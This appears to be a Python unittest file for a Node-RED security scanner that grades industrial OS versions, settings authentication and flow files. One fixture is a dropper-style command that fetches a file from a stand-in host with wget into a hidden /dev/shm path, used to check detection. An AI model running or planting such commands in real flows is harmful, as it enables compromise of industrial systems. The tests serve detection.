import json
import os
import subprocess
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from node_red_scanner import (grade_flows_text, grade_industrial_os,  # noqa: E402
                              grade_settings_text, parse_version)

SCANNER = os.path.join(os.path.dirname(__file__), "..", "node_red_scanner.py")


def run_cli(*args):
    return subprocess.run([sys.executable, SCANNER, *args],
                          capture_output=True, text=True)


def write_tmp(content):
    handle = tempfile.NamedTemporaryFile("w", delete=False, suffix=".js")
    handle.write(content)
    handle.close()
    return handle.name


class TestIndustrialOs(unittest.TestCase):
    def test_below_fixed_vulnerable(self):
        for version in ("4.3.4.0", "4.3.3", "V4.2.0", "3.0"):
            self.assertEqual(grade_industrial_os(version)["verdict"],
                             "VULNERABLE", version)

    def test_fixed_build_and_above(self):
        for version in ("4.3.4.1", "V4.3.4.1", "4.3.4.2", "4.4.0", "5.0"):
            self.assertEqual(grade_industrial_os(version)["verdict"],
                             "FIXED", version)

    def test_unparseable_is_unknown(self):
        self.assertEqual(grade_industrial_os("not-a-version")["verdict"],
                         "UNKNOWN")
        self.assertEqual(grade_industrial_os("")["verdict"], "UNKNOWN")

    def test_parse_version(self):
        self.assertEqual(parse_version("V4.3.4.1"), (4, 3, 4, 1))
        self.assertEqual(parse_version("4.3"), (4, 3, 0, 0))
        self.assertIsNone(parse_version("abc"))


class TestSettings(unittest.TestCase):
    def test_no_admin_auth_vulnerable(self):
        text = "module.exports = { uiPort: 1880 };\n"
        self.assertEqual(grade_settings_text(text)["verdict"], "VULNERABLE")

    def test_commented_admin_auth_still_vulnerable(self):
        text = "// adminAuth: { type: 'credentials', users: [] };\n"
        self.assertEqual(grade_settings_text(text)["verdict"], "VULNERABLE")
        text = "/* adminAuth: { type: 'credentials' } */\n"
        self.assertEqual(grade_settings_text(text)["verdict"], "VULNERABLE")

    def test_live_admin_auth_fixed(self):
        text = ("adminAuth: { type: 'credentials', users: "
                "[{ username: 'admin', password: 'x' }] };\n")
        self.assertEqual(grade_settings_text(text)["verdict"], "FIXED")

    def test_disabled_editor_fixed(self):
        self.assertEqual(grade_settings_text("disableEditor: true;\n")["verdict"],
                         "FIXED")


class TestFlows(unittest.TestCase):
    def test_clean_flows(self):
        nodes = [{"id": "1", "type": "inject", "wires": [["2"]]},
                 {"id": "2", "type": "debug", "wires": []}]
        self.assertEqual(grade_flows_text(json.dumps(nodes))["verdict"], "CLEAN")

    def test_exec_node_needs_review(self):
        nodes = [{"id": "1", "type": "exec", "command": "ls", "wires": []}]
        self.assertEqual(grade_flows_text(json.dumps(nodes))["verdict"], "REVIEW")

    def test_http_in_wired_to_exec_needs_review(self):
        nodes = [{"id": "1", "type": "http in", "wires": [["2"]]},
                 {"id": "2", "type": "exec", "command": "id", "wires": []}]
        self.assertEqual(grade_flows_text(json.dumps(nodes))["verdict"], "REVIEW")

    def test_dropper_marker_needs_review(self):
        nodes = [{"id": "1", "type": "function",
                  "func": "wget http://example.invalid/x -O /dev/shm/.b",
                  "wires": []}]
        self.assertEqual(grade_flows_text(json.dumps(nodes))["verdict"], "REVIEW")

    def test_invalid_json_unknown(self):
        self.assertEqual(grade_flows_text("{not json")["verdict"], "UNKNOWN")


class TestCli(unittest.TestCase):
    def test_vulnerable_exit_2(self):
        proc = run_cli("--industrial-os", "4.3.4.0")
        self.assertEqual(proc.returncode, 2)
        self.assertIn("VULNERABLE", proc.stdout)

    def test_fixed_exit_0(self):
        proc = run_cli("--industrial-os", "4.3.4.1")
        self.assertEqual(proc.returncode, 0)
        self.assertIn("FIXED", proc.stdout)

    def test_settings_file_vulnerable(self):
        path = write_tmp("module.exports = {};\n")
        try:
            proc = run_cli("--settings", path)
            self.assertEqual(proc.returncode, 2)
        finally:
            os.unlink(path)

    def test_json_output(self):
        proc = run_cli("--industrial-os", "4.3.4.1", "--json")
        self.assertEqual(json.loads(proc.stdout)[0]["verdict"], "FIXED")

    def test_list_table(self):
        proc = run_cli("--list")
        self.assertEqual(proc.returncode, 0)
        self.assertIn("4.3.4.1", proc.stdout)

    def test_inventory(self):
        with tempfile.NamedTemporaryFile("w", delete=False, suffix=".json") as handle:
            json.dump([{"name": "gw-1", "industrial_os": "4.3.4.0"},
                       {"name": "gw-2", "industrial_os": "4.3.4.1"}], handle)
            path = handle.name
        try:
            proc = run_cli("--inventory-json", path)
            self.assertEqual(proc.returncode, 2)
            self.assertIn("gw-1", proc.stdout)
        finally:
            os.unlink(path)


if __name__ == "__main__":
    unittest.main()
